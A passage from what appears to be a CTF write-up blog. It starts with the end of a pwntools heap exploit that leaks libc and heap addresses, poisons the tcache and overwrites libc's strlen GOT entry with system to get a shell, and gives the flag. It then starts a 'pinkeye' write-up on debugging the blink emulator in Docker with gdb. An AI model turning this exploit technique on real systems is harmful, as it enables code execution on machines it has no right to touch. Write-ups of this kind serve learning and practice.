</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x461</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;change chunk size&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">205</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="mi">205</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">96</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Cleanup unsorted_bin by allocating a lot of new chunks</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x120</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;allocate a lot of new chunks&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Fulfill tcache</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">destroy</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">198</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">197</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">198</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Leak new heap</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="mi">197</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">demangle</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Empty tcache</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Tcache poisoning</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1f6080</span> <span class="c1"># strlen GOT entry address</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">,</span> <span class="n">target</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Use 2 tcache items</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Poison the libc GOT entries, because this</span>
</span></span><span class="line"><span class="cl"><span class="c1"># allocation will allocate a new chunk in the target,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># which is strlen GOT entry address</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Remember that add function memset the chunk to 0, so we</span>
</span></span><span class="line"><span class="cl"><span class="c1"># need to ensure the other GOT entry near strlen remains the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># same</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff976890</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff972710</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff973db0</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff976b80</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff973660</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff9719c0</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff822180</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff822190</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff8ad6d0</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff970b60</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff974190</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7f00ff8221d0</span><span class="o">-</span><span class="mh">0x7f00ff800000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">[:</span><span class="mh">0x64</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># View index -4 manually</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: CJ2023{95b7d2fa59d0fc9372d62b83b5250bc2}</strong></p>
</blockquote>
<h2 id="pinkeye">pinkeye</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>cant stop blinking when you got pinkeye</p>
<p>137.184.6.25 17003</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis-1">Initial Analysis</h3>
<p>In this challenge, we were given a binary called <code>blink</code> and a <code>Dockerfile</code> to build it locally. Taking a look in the given <code>Dockerfile</code>, we can see that <code>blink</code> is actually taken from an open source <a href="https://github.com/jart/blink" target="_blank" rel="noopener noreffer ">repository</a>. Based on the information in the repository, <code>blink</code> is a virtual machine that can be used to emulate x86-64 programs.</p>
<p>I was trying to clone the repository and try to read the source code, but it has too many codes and I&rsquo;m too lazy to read it. So, I decided to blackbox this challenge, by trying to create a simple ELF, put it in the <code>blink</code> binary, and observe its behavior using <code>gdb</code>.</p>
<h4 id="setup-debugging-environment">Setup Debugging Environment</h4>
<p>First, we need to setup the debugging environment first. During the competition, trying to debug directly in the docker helps me a lot because the memory layout in my local and docker are different. So, let&rsquo;s start by modifying the given <code>Dockerfile</code> and <code>docker-compose.yml</code>, so that we can debug it easily.</p>
<p>For the <code>Dockerfile</code>, let&rsquo;s remove user <code>1000</code> and install <code>gdb</code> and my favorite extension, <code>pwndbg</code>. Below is the modified <code>Dockerfile</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> ubuntu:22.04</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENV</span> DEBIAN_FRONTEND noninteractive<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get update<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get install python3 -qy<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt install git gdb nano -y<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> git clone https://github.com/pwndbg/pwndbg <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="nb">cd</span> pwndbg <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    ./setup.sh<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ynetd /<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> chall /app<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s1">&#39;CJ2023{test_flag}&#39;</span> &gt; /flag-<span class="sb">`</span>tr -dc A-Za-z0-9 &lt; /dev/urandom <span class="p">|</span> head -c 20<span class="sb">`</span>.txt<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /app</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">EXPOSE</span><span class="s"> 13337</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> /ynetd -p <span class="m">13337</span> <span class="s2">&#34;timeout 60 python3 -u ./runner.py 2&gt;/dev/null&#34;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>We also need to modify the <code>docker-compose.yml</code> file so that we can debug running process with <code>gdb</code>. Below is the modified <code>docker-compose.yml</code> file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;3&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">services</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">blink</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">always</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">build</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">working_dir</span><span class="p">:</span><span class="w"> </span><span class="l">/app</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">ports</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;17003:13337&#34;</span><span class="w"> </span><span class="c"># exposed:local</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">cap_add</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="l">SYS_PTRACE</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Now, build this container and we will be able to debug and replicate the remote environment as close as possible. We can simply go into the container <code>bash</code>, then run the <code>gdb</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">docker</span> <span class="n">exec</span> <span class="o">-</span><span class="n">it</span> <span class="n">pinkeye_blink_1</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="err">@</span><span class="mi">7</span><span class="n">c95c1ab911f</span><span class="p">:</span><span class="o">/</span><span class="n">app</span><span class="c1"># LC_CTYPE=C.UTF-8 gdb blink</span>
</span></span><span class="line"><span class="cl"><span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="mf">12.1</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu1</span><span class="o">~</span><span class="mf">22.04</span><span class="p">)</span> <span class="mf">12.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">License</span> <span class="n">GPLv3</span><span class="o">+</span><span class="p">:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="ow">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">licenses</span><span class="o">/</span><span class="n">gpl</span><span class="o">.</span><span class="n">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">There</span> <span class="n">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Type</span> <span class="s2">&#34;show copying&#34;</span> <span class="ow">and</span> <span class="s2">&#34;show warranty&#34;</span> <span class="k">for</span> <span class="n">details</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="n">as</span> <span class="s2">&#34;x86_64-linux-gnu&#34;</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Type</span> <span class="s2">&#34;show configuration&#34;</span> <span class="k">for</span> <span class="n">configuration</span> <span class="n">details</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="n">see</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">bugs</span><span class="o">/&gt;.</span>
</span></span><span class="line"><span class="cl"><span class="n">Find</span> <span class="n">the</span> <span class="n">GDB</span> <span class="n">manual</span> <span class="ow">and</span> <span class="n">other</span> <span class="n">documentation</span> <span class="n">resources</span> <span class="n">online</span> <span class="n">at</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">documentation</span><span class="o">/&gt;.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">For</span> <span class="n">help</span><span class="p">,</span> <span class="n">type</span> <span class="s2">&#34;help&#34;</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Type</span> <span class="s2">&#34;apropos word&#34;</span> <span class="n">to</span> <span class="n">search</span> <span class="k">for</span> <span class="n">commands</span> <span class="n">related</span> <span class="n">to</span> <span class="s2">&#34;word&#34;</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="p">:</span> <span class="n">loaded</span> <span class="mi">151</span> <span class="n">pwndbg</span> <span class="n">commands</span> <span class="ow">and</span> <span class="mi">39</span> <span class="n">shell</span> <span class="n">commands</span><span class="o">.</span> <span class="n">Type</span> <span class="n">pwndbg</span> <span class="p">[</span><span class="o">--</span><span class="n">shell</span> <span class="o">|</span> <span class="o">--</span><span class="n">all</span><span class="p">]</span> <span class="p">[</span><span class="n">filter</span><span class="p">]</span> <span class="k">for</span> <span class="n">a</span> <span class="n">list</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="p">:</span> <span class="n">created</span> <span class="o">$</span><span class="n">rebase</span><span class="p">,</span> <span class="o">$</span><span class="n">ida</span> <span class="n">GDB</span> <span class="n">functions</span> <span class="p">(</span><span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">with</span> <span class="nb">print</span><span class="o">/</span><span class="k">break</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="n">blink</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">No</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">blink</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">-------</span> <span class="n">tip</span> <span class="n">of</span> <span class="n">the</span> <span class="n">day</span> <span class="p">(</span><span class="n">disable</span> <span class="n">with</span> <span class="n">set</span> <span class="n">show</span><span class="o">-</span><span class="n">tips</span> <span class="n">off</span><span class="p">)</span> <span class="o">-------</span>
</span></span><span class="line"><span class="cl"><span class="n">Use</span> <span class="n">GDB</span><span class="s1">&#39;s dprintf command to print all calls to given function. E.g. dprintf malloc, &#34;malloc(%p)</span><span class="se">\n</span><span class="s1">&#34;, (void*)$rdi will print all malloc calls</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="blackbox-testing">Blackbox Testing</h4>
<p>To do the blackbox testing, I started by creating this very simple assembly code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl">%<span class="n">use</span> <span class="n">masm</span>
</span></span><span class="line"><span class="cl"><span class="n">_start</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">nop</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x0101010101010101</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mh">0x0202020202020202</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x0303030303030303</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="mh">0x0404040404040404</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="mh">0x0505050505050505</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="mh">0x0606060606060606</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r8</span><span class="p">,</span>  <span class="mh">0x0808080808080808</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r9</span><span class="p">,</span>  <span class="mh">0x0909090909090909</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="mh">0x0a0a0a0a0a0a0a0a</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x0b0b0b0b0b0b0b0b</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r12</span><span class="p">,</span> <span class="mh">0x0c0c0c0c0c0c0c0c</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r13</span><span class="p">,</span> <span class="mh">0x0d0d0d0d0d0d0d0d</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r14</span><span class="p">,</span> <span class="mh">0x0e0e0e0e0e0e0e0e</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r15</span><span class="p">,</span> <span class="mh">0x0f0f0f0f0f0f0f0f</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">inf_loop</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">jmp</span> <span class="n">inf_loop</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above assembly can be used to observe where the <code>blink</code> stores the emulated <code>registers</code> value. I put an infinite loop at the end so that the program will keep running and we can easily attach a <code>gdb</code> to the <code>blink</code> binary and observe its behavior.</p>
<p>We can compile the above assembly with this command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
